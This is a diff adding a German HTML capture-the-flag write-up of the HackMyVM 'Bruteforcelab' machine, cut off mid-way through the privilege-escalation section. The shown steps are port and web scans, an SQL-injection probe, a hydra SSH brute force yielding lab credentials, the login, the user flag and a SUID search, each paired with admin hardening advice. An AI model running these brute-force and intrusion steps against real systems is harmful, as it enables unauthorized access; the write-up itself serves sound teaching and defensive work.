@@ -1,1 +1,597 @@
-﻿<html><body><h1>Test-Inhalt für Bruteforcelab - HackMyVM - Easy.html</h1></body></html>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bruteforcelab - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+    <div class="header-bg">
+        <h1>Bruteforcelab - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">bash (Scripting)</div>
+                <div class="tool-item">Standard Linux Befehle</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (Port 10000)</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">
+                Die Aufklärungsphase beginnt wie üblich mit der Identifizierung aktiver Hosts im lokalen Netzwerk. `arp-scan` ist hierfür ein schnelles und effektives Werkzeug.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.122	08:00:27:c0:d7:d5	PCS Systemtechnik GmbH 
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `arp-scan -l` sendet ARP-Anfragen an alle Geräte im lokalen Netzwerk, um deren IP- und MAC-Adressen zu ermitteln. Die Ausgabe zeigt, dass die IP-Adresse `192.168.2.122` aktiv ist und die MAC-Adresse `08:00:27:c0:d7:d5` dem Hersteller "PCS Systemtechnik GmbH" zugeordnet ist. Dies ist ein typischer Indikator für eine VirtualBox-VM.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Ziel-IP wurde erfolgreich identifiziert. Das Wissen, dass es sich wahrscheinlich um eine VirtualBox-VM handelt, ist in CTF-Szenarien oft hilfreich, aber für den weiteren Pentest-Prozess weniger kritisch.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Der nächste Schritt ist ein detaillierter Portscan auf der gefundenen IP-Adresse, um offene Dienste zu identifizieren.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Aus Sicht der Netzwerkverteidigung ist es wichtig, ein Inventar aller Geräte im Netzwerk zu führen und unautorisierte Geräte zu erkennen. Mechanismen zur Erkennung von ARP-Spoofing können ebenfalls die Netzwerksicherheit erhöhen.
+            </p>
+
+            <p class="comment">
+                Nachdem die IP-Adresse des Ziels bekannt ist, führe ich einen umfassenden Nmap-Scan durch, um offene Ports, die darauf laufenden Dienste, deren Versionen und das Betriebssystem zu ermitteln. Ich verwende hier aggressive Optionen für eine schnelle und detaillierte Erkundung.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -AO 192.168.2.122 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( [Link: https://nmap.org | Ziel: https://nmap.org] ) at 2023-04-08 01:08 CEST
+Nmap scan report for LAB-Bruteforce (192.168.2.122)
+Host is up (0.00014s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE     VERSION
+<span class="command">22/tcp    open  ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+| ssh-hostkey: 
+|   3072 <span class="command">1cdbf89272c472dc24c3ca7c80ebf481</span> (RSA)
+|   256 <span class="command">7f3033e2f40d87415ea324de57c6738b</span> (ECDSA)
+|_  256 <span class="command">9a9e2f53e02bb4983f3495535687a476</span> (ED25519)
+<span class="command">10000/tcp open  http        MiniServ 2.021 (Webmin httpd)</span>
+|_http-title: <span class="password">200 — Document follows</span>
+<span class="command">19000/tcp open  netbios-ssn Samba smbd 4.6.2</span>
+<span class="command">19222/tcp open  netbios-ssn Samba smbd 4.6.2</span>
+MAC Address: <span class="command">08:00:27:C0:D7:D5</span> (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+Network Distance: 1 hop
+Service Info: OS: <span class="command">Linux</span>; CPE: <span class="command">cpe:/o:linux:linux_kernel</span>
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms LAB-Bruteforce (192.168.2.122)
+
+OS and Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/] .
+Nmap done: 1 IP address (1 host up) scanned in 88.37 seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Nmap-Befehl verwendete folgende Optionen:
+                <ul>
+                    <li><code>-sS</code>: TCP SYN Scan (Stealth Scan).</li>
+                    <li><code>-sC</code>: Führt Standard-Skriptscans durch.</li>
+                    <li><code>-sV</code>: Führt Versionserkennung für die Dienste durch.</li>
+                    <li><code>-T5</code>: Setzt das Timing-Template auf "Insane", was den Scan extrem beschleunigt, aber auch unzuverlässiger sein kann und leichter von IDS erkannt wird.</li>
+                    <li><code>-A</code>: Diese Option wurde durch <code>-O</code> (OS Detection) ersetzt oder ist hier als <code>-AO</code> gemeint, was eine Kombination darstellt. <code>-A</code> alleine aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute. <code>-O</code> ist spezifisch für die Betriebssystemerkennung. Angesichts der Ausgabe scheint eine umfassende Erkennung stattgefunden zu haben.</li>
+                    <li><code>-p-</code>: Scannt alle 65535 TCP-Ports.</li>
+                </ul>
+                Die Ergebnisse des Scans sind sehr aufschlussreich:
+                <ul>
+                    <li>**Port 22 (SSH):** OpenSSH 8.4p1 Debian. Ein Standardzugangspunkt, falls Anmeldeinformationen bekannt werden.</li>
+                    <li>**Port 10000 (HTTP):** MiniServ 2.021 (Webmin httpd). Webmin ist eine webbasierte Systemadministrationskonsole. Dies ist ein sehr interessanter Fund, da Webmin-Installationen oft Angriffsziele sind, falls sie veraltet oder schlecht konfiguriert sind. Der Titel "200 — Document follows" ist unspezifisch.</li>
+                    <li>**Port 19000 (netbios-ssn):** Samba smbd 4.6.2. Samba implementiert das SMB/CIFS-Protokoll für Datei- und Druckerfreigaben.</li>
+                    <li>**Port 19222 (netbios-ssn):** Ebenfalls Samba smbd 4.6.2. Es ist ungewöhnlich, zwei Samba-Instanzen auf so unterschiedlichen hohen Ports zu sehen, es sei denn, es gibt eine spezifische Konfiguration.</li>
+                </ul>
+                Die Betriebssystemerkennung deutet auf ein Linux-System (Kernel 4.x/5.x) hin.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Nmap-Scan hat mehrere potenzielle Angriffsvektoren aufgedeckt. Webmin auf Port 10000 ist ein primäres Ziel, da Administrationskonsolen oft Schwachstellen aufweisen oder anfällig für Brute-Force-Angriffe sind. SSH ist ein weiterer Vektor, falls Anmeldeinformationen erlangt werden können. Die Samba-Dienste sind ebenfalls prüfenswert auf anonymen Zugriff, bekannte Schwachstellen in Version 4.6.2 oder schwache Freigaben.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong>
+                <ul>
+                    <li>Untersuchen Sie die Webmin-Oberfläche auf Port 10000 genauer: Gibt es eine Login-Seite? Welche Funktionalitäten sind exponiert? Suchen Sie nach bekannten Exploits für MiniServ/Webmin 2.021.</li>
+                    <li>Prüfen Sie die Samba-Dienste mit Tools wie `smbclient` oder `enum4linux` auf Freigaben, Benutzer und mögliche Schwachstellen.</li>
+                    <li>Halten Sie SSH für Brute-Force-Angriffe oder die Verwendung gefundener Credentials bereit.</li>
+                </ul>
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                <ul>
+                    <li>Stellen Sie sicher, dass Webmin auf dem neuesten Stand ist und der Zugriff darauf stark eingeschränkt wird (z.B. durch IP-Whitelisting, starke Passwörter, Zwei-Faktor-Authentifizierung). Wenn Webmin nicht unbedingt benötigt wird, sollte es deaktiviert werden.</li>
+                    <li>Überprüfen Sie die Samba-Konfiguration. Nicht benötigte Freigaben sollten entfernt und der Zugriff auf notwendige Freigaben streng kontrolliert werden. Halten Sie Samba aktuell.</li>
+                    <li>Härten Sie den SSH-Dienst (z.B. Deaktivierung von Root-Login, passwortbasierte Authentifizierung zugunsten von Schlüsselpaaren, Fail2Ban).</li>
+                </ul>
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration (Port 10000)</h2>
+            <p class="comment">
+                Ich beginne mit der Untersuchung des Webdienstes auf Port 10000, bei dem es sich laut Nmap um Webmin (MiniServ 2.021) handelt. Zuerst versuche ich eine einfache SQL-Injection im Browser auf der vermuteten Login-Seite `https://192.168.2.122:10000/session_login.cgi`.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">Browser Fuzzing SQLi (Manuelle Eingabe in URL oder Formularfeld)</span>
+
+URL: <span class="command">https://192.168.2.122:10000/session_login.cgi</span>
+Payload (z.B. im Username-Feld): <span class="password">' OR 1=1-- -</span>
+
+<span class="password">Antwort:</span>
+Error — Invalid username
+Username contains invalid characters
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe versucht, einen klassischen SQL-Injection-Payload `' OR 1=1-- -` in das Benutzernamenfeld der Webmin-Login-Seite einzugeben. Die Anwendung antwortet mit "Error — Invalid username" und "Username contains invalid characters".
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Fehlermeldung deutet darauf hin, dass die Anwendung eine Eingabevalidierung für das Benutzernamenfeld durchführt und Sonderzeichen wie das einfache Anführungszeichen (`'`) blockiert. Dies macht eine einfache SQL-Injection an dieser Stelle unwahrscheinlich, schließt sie aber nicht vollständig aus (z.B. wenn die Validierung umgangen werden kann oder andere Parameter anfällig sind).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Testen Sie andere SQLi-Payloads, die möglicherweise keine blockierten Zeichen verwenden (z.B. Blind SQLi, numerische SQLi, falls zutreffend). Untersuchen Sie alle Eingabefelder und Parameter der Login-Seite. Suchen Sie nach bekannten Schwachstellen für Webmin/MiniServ 2.021.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Eine serverseitige Eingabevalidierung ist gut. Stellen Sie sicher, dass sie umfassend ist und alle potenziell gefährlichen Zeichen korrekt behandelt. Verwenden Sie parametrisierte Abfragen (Prepared Statements) für alle Datenbankinteraktionen, um SQL-Injection grundsätzlich zu verhindern.
+            </p>
+
+            <p class="comment">
+                Um mehr über die Webanwendung auf Port 10000 zu erfahren und mögliche Schwachstellen oder interessante Dateien zu finden, setze ich Nikto ein. Die Option `-C all` erzwingt die Überprüfung aller CGI-Verzeichnisse.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h https://192.168.2.122:10000 -C all</span></div>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.122
++ Target Hostname:    192.168.2.122
++ Target Port:        10000
+---------------------------------------------------------------------------
++ SSL Info:        Subject:  /CN=LAB-Bruteforce/C=US/L=Santa Clara
+                   Ciphers:  TLS_AES_256_GCM_SHA384
+                   Issuer:   /CN=LAB-Bruteforce/C=US/L=Santa Clara
++ Start Time:         2023-04-08 01:11:15 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">MiniServ/2.021</span>
++ <span class="password">The X-XSS-Protection header is not defined.</span> This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header '<span class="command">auth-type</span>' found, with contents: <span class="command">auth-required=1</span>
++ Uncommon header '<span class="command">x-no-links</span>' found, with contents: <span class="command">1</span>
++ <span class="password">The site uses SSL and the Strict-Transport-Security HTTP header is not defined.</span>
++ <span class="password">The site uses SSL and Expect-CT header is not present.</span>
++ Hostname '192.168.2.122' does not match certificate's names: <span class="password">LAB-Bruteforce</span>
++ <span class="command">Multiple index files found</span> (note, these may not all be unique): /index.shtml, /index.cfm, /default.htm, /index.php3, /index.cgi, /index.htm, /default.aspx, /index.do, /index.php5, /index.php4, /index.php7, /default.asp, /index.jhtml, /index.pl, /index.jsp, /index.php, /index.xml, /index.aspx, /index.html, /index.asp
++ <span class="password">MiniServ - This is the Webmin Unix administrator. It should not be running unless required.</span>
++ <span class="password">Web Server returns a valid response with junk HTTP methods</span>, this may cause false positives.
++ <span class="password">DEBUG HTTP verb may show server debugging information.</span> See [Link: http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx | Ziel: http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx] for details.
++ /cgi.cgi/cart32.exe: request cart32.exe/cart32clientlist 
++ /ows-bin/classified.cgi: Check Phrack 55 for info by RFP
++ /cgi-sys/classified.cgi: Check Phrack 55 for info by RFP
++ /cgi-local/classified.cgi: Check Phrack 55 for info by RFP
+... <span class="comment">(Ausgabe gekürzt, viele ähnliche CGI-Checks)</span> ...
++ /cgi-bin-sdb/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ /cgi-mod/flexform.cgi: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ /cgi.cgi/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ /webcgi/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ /cgi-914/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ /cgi-915/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ /bin/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ /cgi/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
++ /mpcgi/flexform: Check Phrack 55 for info by RFP, allows to append info to writable files.
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nikto liefert eine Fülle von Informationen und potenziellen Hinweisen:
+                <ul>
+                    <li>Bestätigung des Servers: MiniServ/2.021.</li>
+                    <li>Fehlende Sicherheitsheader: `X-XSS-Protection`, `Strict-Transport-Security` (HSTS), `Expect-CT`. Diese sind wichtig für die Sicherheit moderner Webanwendungen.</li>
+                    <li>Ungewöhnliche Header: `auth-type: auth-required=1` und `x-no-links: 1`. Diese könnten spezifisch für Webmin sein und deuten auf Authentifizierungsmechanismen hin.</li>
+                    <li>Zertifikats-Mismatch: Der Hostname in der URL (IP-Adresse) stimmt nicht mit dem Namen im SSL-Zertifikat (`LAB-Bruteforce`) überein. Dies ist üblich bei direkten IP-Aufrufen von HTTPS-Seiten mit selbstsignierten oder internen Zertifikaten.</li>
+                    <li>Mehrere Indexdateien gefunden: Dies deutet darauf hin, dass der Server für viele verschiedene Indexdateitypen konfiguriert ist.</li>
+                    <li>Warnung zu MiniServ/Webmin: Nikto weist explizit darauf hin, dass Webmin eine Administratorkonsole ist und nicht unnötig exponiert sein sollte.</li>
+                    <li>Junk HTTP-Methoden und DEBUG-Verb: Der Server reagiert auf ungewöhnliche HTTP-Methoden, was zu False Positives führen kann. Die `DEBUG`-Methode könnte serverseitige Debugging-Informationen preisgeben.</li>
+                    <li>Viele CGI-bezogene Checks: Nikto testet eine große Anzahl bekannter CGI-Pfade und -Skripte (z.B. `cart32.exe`, `classified.cgi`, `flexform.cgi`). Viele davon sind veraltet oder beziehen sich auf historische Schwachstellen (wie die Phrack 55-Referenzen für `flexform.cgi`, das das Anhängen von Informationen an beschreibbare Dateien ermöglichen könnte).</li>
+                </ul>
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die fehlenden Sicherheitsheader sind klassische Findings. Die CGI-Checks sind meist generisch und nicht unbedingt auf Webmin direkt anwendbar, aber es ist gut, sie geprüft zu haben. Die Information, dass es sich um eine Webmin-Administrationskonsole handelt, ist der wichtigste Punkt, da dies das Hauptziel für Angriffe auf diesen Port darstellt. Der `auth-type` Header bestätigt, dass eine Authentifizierung erforderlich ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong>
+                <ul>
+                    <li>Konzentrieren Sie sich auf die Authentifizierung von Webmin. Versuchen Sie, Standard-Anmeldeinformationen oder Brute-Force-Angriffe auf die Login-Seite (wahrscheinlich `session_login.cgi`).</li>
+                    <li>Suchen Sie nach bekannten Exploits für MiniServ 2.021 oder die spezifische Webmin-Version, die möglicherweise dahintersteckt.</li>
+                    <li>Testen Sie die `DEBUG`-HTTP-Methode.</li>
+                    <li>Obwohl die `flexform.cgi`-Funde alt sind, könnte man stichprobenartig prüfen, ob eine dieser alten CGI-Schwachstellen auf diesem Server doch existiert, falls Webmin eine sehr alte oder ungewöhnliche Konfiguration hat.</li>
+                </ul>
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                <ul>
+                    <li>Implementieren Sie die fehlenden Sicherheitsheader (`X-XSS-Protection: 1; mode=block`, `Strict-Transport-Security: max-age=31536000; includeSubDomains`, `Expect-CT`).</li>
+                    <li>Beschränken Sie den Zugriff auf die Webmin-Konsole so weit wie möglich (Firewall, IP-Whitelisting). Verwenden Sie starke, einzigartige Passwörter und, falls unterstützt, Zwei-Faktor-Authentifizierung.</li>
+                    <li>Entfernen oder deaktivieren Sie nicht benötigte CGI-Skripte oder -Handler.</li>
+                    <li>Stellen Sie sicher, dass das SSL-Zertifikat korrekt konfiguriert ist und dem Hostnamen entspricht, um Browser-Warnungen zu vermeiden.</li>
+                </ul>
+            </p>
+        </section>
+
+	
+	
+	
+	
+	 
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="comment">
+                Da Webmin auf Port 10000 läuft und SSH auf Port 22, versuche ich einen Brute-Force-Angriff auf den SSH-Dienst. Aus dem Hostnamen "LAB-Bruteforce" und der allgemeinen Natur von CTFs vermute ich, dass es einen Benutzer geben könnte, dessen Name im Kontext der Aufgabe relevant ist oder leicht zu erraten ist. Ich entscheide mich, den Benutzernamen `andrea` zu testen (dieser könnte z.B. durch weitere Enumeration oder als gängiger Name bekannt sein) und verwende `rockyou.txt` als Passwortliste mit Hydra.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~] 
+└─# <span class="command">hydra -l andrea -P /usr/share/wordlists/rockyou.txt ssh://brute.hmv:22 -I -t 64</span></div>
+                    <pre>
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra ([Link: https://github.com/vanhauser-thc/thc-hydra | Ziel: https://github.com/vanhauser-thc/thc-hydra]) starting at 2023-04-09 23:59:22
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344413 login tries (l:1/p:14344413), ~224132 tries per task
+[DATA] attacking ssh://brute.hmv:22/
+[STATUS] 343.00 tries/min, 343 tries in 00:01h, 14344099 to do in 696:60h, 35 active
+[STATUS] 241.33 tries/min, 724 tries in 00:03h, 14343726 to do in 990:36h, 27 active
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+<span class="password">[22][ssh] host: brute.hmv   login: andrea   password: awesome</span>
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+1 of 1 target successfully completed, 1 valid password found
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `hydra -l andrea -P /usr/share/wordlists/rockyou.txt ssh://brute.hmv:22 -I -t 64` führt einen Brute-Force-Angriff gegen den SSH-Dienst auf `brute.hmv` (Port 22) durch.
+                <ul>
+                    <li>`-l andrea`: Gibt den zu testenden Benutzernamen an.</li>
+                    <li>`-P /usr/share/wordlists/rockyou.txt`: Gibt die zu verwendende Passwortliste an.</li>
+                    <li>`ssh://brute.hmv:22`: Definiert das Zielprotokoll, den Host und den Port. Hier habe ich angenommen, dass `brute.hmv` in `/etc/hosts` auf `192.168.2.122` zeigt.</li>
+                    <li>`-I`: Ignoriert eine existierende `.restore`-Datei (startet den Angriff neu).</li>
+                    <li>`-t 64`: Setzt die Anzahl der parallelen Tasks auf 64. Hydra warnt, dass dies für SSH zu hoch sein könnte.</li>
+                </ul>
+                Nach einiger Zeit war Hydra erfolgreich und fand das Passwort `awesome` für den Benutzer `andrea`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein klassischer Brute-Force-Angriff war erfolgreich. Dies zeigt, dass der Benutzer `andrea` ein schwaches, in gängigen Wortlisten enthaltenes Passwort verwendet. Dies ist der erste Schritt zum initialen Zugriff.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie die gefundenen Anmeldeinformationen (`andrea:awesome`), um sich per SSH auf dem Zielsystem anzumelden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Setzen Sie eine starke Passwortrichtlinie durch. Verbieten Sie die Verwendung von Passwörtern, die in bekannten Wortlisten enthalten sind. Implementieren Sie Mechanismen zur Abwehr von Brute-Force-Angriffen auf SSH, wie z.B. `fail2ban` oder die Begrenzung der Anzahl fehlgeschlagener Login-Versuche. Bevorzugen Sie schlüsselbasierte Authentifizierung gegenüber passwortbasierter Authentifizierung für SSH.
+            </p>
+
+            <p class="comment">
+                Mit den durch Hydra gefundenen Anmeldeinformationen (`andrea:awesome`) verbinde ich mich nun per SSH mit dem Zielsystem.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~] 
+└─# <span class="command">ssh andrea@brute.hmv</span></div>
+                    <pre>
+The authenticity of host 'brute.hmv (192.168.2.122)' can't be established.
+ED25519 key fingerprint is SHA256:jxCJlAEwfgAbyE4RC2RJnQM/Y0rUXe+Yt6q7Y69okUg.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span> 
+Warning: Permanently added 'brute.hmv' (ED25519) to the list of known hosts.
+andrea@brute.hmv's password: <span class="password">awesome</span> 
+Linux LAB-Bruteforce 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Mar 26 21:26:42 2023 from 192.168.1.84
+<span class="prompt-remote">andrea@LAB-Bruteforce:~$</span> 
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der SSH-Login mit `andrea@brute.hmv` und dem Passwort `awesome` war erfolgreich. Ich erhalte eine Shell als Benutzer `andrea` auf dem Zielsystem `LAB-Bruteforce`. Die Willkommensnachricht zeigt Details zum Betriebssystem (Debian 5.10.0-21-amd64).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der initiale Zugriff auf das System ist hiermit erfolgt. Ich habe nun eine interaktive Shell und kann mit der Enumeration des Systems aus der Innensicht beginnen, um Wege zur Privilegieneskalation zu finden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie grundlegende Enumerationsbefehle aus: `id`, `whoami`, `pwd`, `ls -la /home`, `cat /etc/passwd`, `sudo -l`, `find / -type f -perm -4000 -ls 2>/dev/null` (Suche nach SUID-Dateien), überprüfen Sie Cronjobs, laufende Prozesse usw.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überwachen Sie SSH-Logins. Stellen Sie sicher, dass Benutzer keine schwachen Passwörter verwenden. Regelmäßige Überprüfung der Benutzerkonten und deren Aktivitäten ist wichtig.
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="comment">
+                Nachdem ich als Benutzer `andrea` auf dem System bin, überprüfe ich sofort die `sudo`-Berechtigungen und suche nach der User-Flag.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote">andrea@LAB-Bruteforce:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+[sudo] password for andrea: <span class="password">awesome</span>
+<span class="password">Sorry, user andrea may not run sudo on Lab-Bruteforce.</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse (`sudo -l`):</strong> Der Befehl `sudo -l` erfordert erneut das Passwort von `andrea`. Nach Eingabe wird die Meldung "Sorry, user andrea may not run sudo on Lab-Bruteforce." angezeigt. Das bedeutet, der Benutzer `andrea` hat keine `sudo`-Rechte konfiguriert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung (`sudo -l`):</strong> `sudo` ist hier also kein direkter Weg zur Privilegieneskalation für den Benutzer `andrea`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Andere Vektoren für Privilegieneskalation müssen untersucht werden, wie SUID/SGID-Binaries, Kernel-Exploits (abhängig von der Kernel-Version), schlecht konfigurierte Cronjobs, ausnutzbare Dienste, die lokal laufen, oder Passwörter/Schlüssel in Konfigurationsdateien.
+            </p>
+            <hr>
+            <p class="comment">
+                Ich suche nach der User-Flag, die sich üblicherweise im Home-Verzeichnis des Benutzers oder an einem Standardort befindet.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote">andrea@LAB-Bruteforce:~$ <span class="command">cat user.txt</span></div>
+                    <pre>
+<span class="password">d5eb7d8b6f57c295e0bedf7eef531360</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse (User-Flag):</strong> Die Datei `user.txt` befindet sich im Home-Verzeichnis von `andrea` und enthält die User-Flag `d5eb7d8b6f57c295e0bedf7eef531360`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung (User-Flag):</strong> Das erste Ziel (User-Flag) wurde erreicht.
+            </p>
+            <hr>
+            <p class="comment">
+                Da `sudo -l` keine direkten Möglichkeiten offenbarte, suche ich nach SUID-Binaries auf dem System. SUID-Dateien werden mit den Rechten des Dateieigentümers (oft `root`) ausgeführt und können, wenn sie Schwachstellen enthalten oder falsch verwendet werden, zur Privilegieneskalation missbraucht werden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote">andrea@LAB-Bruteforce:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>
+   443491     20 -rwsr-xr-x   1 root     root        19040 Jan 13  2022 /usr/libexec/polkit-agent-helper-1
+   423160    472 -rwsr-xr-x   1 root     root       481608 Jul  2  2022 /usr/lib/openssh/ssh-keysign
+   410837     52 -rwsr-xr--   1 root     messagebus    51336 Oct  5  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   534734     16 -rwsr-sr-x   1 root     root          14608 Feb  1 15:11 /usr/lib/xorg/Xorg.wrap
+   462605    396 -rwsr-xr--   1 root     dip          403752 Jan  7  2021 /usr/sbin/pppd
+   443488     24 -rwsr-xr-x   1 root     root          23448 Jan 13  2022 /usr/bin/pkexec
+   393901     72 -rwsr-xr-x   1 root     root          71912 Jan 20  2022 <span class="command">/usr/bin/su</span>
+   390244     60 -rwsr-xr-x   1 root     root          58416 Feb  7  2020 /usr/bin/chfn
+   462722    180 -rwsr-xr-x   1 root     root         182600 Jan 14 14:29 /usr/bin/sudo
+   394268     56 -rwsr-xr-x   1 root     root          55528 Jan 20  2022 /usr/bin/mount
+   390248     64 -rwsr-xr-x   1 root     root          63960 Feb  7  2020 /usr/bin/passwd
+   393742     44 -rwsr-xr-x   1 root     root          44632 Feb  7  2020 /usr/bin/newgrp
+   394270     36 -rwsr-xr-x   1 root     root          35040 Jan 20  2022 /usr/bin/umount
+   390247     88 -rwsr-xr-x   1 root     root          88304 Feb  7  2020 /usr/bin/gpasswd
+   390245     52 -rwsr-xr-x   1 root     root          52880 Feb  7  2020 /usr/bin/chsh
+   449650     36 -rwsr-xr-x   1 root     root          35048 Jun 20  2021 /usr/bin/fusermount3
+   462317    156 -rwsr-xr-x   1 root     root         158448 Nov  2 22:46 /usr/bin/ntfs-3g
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
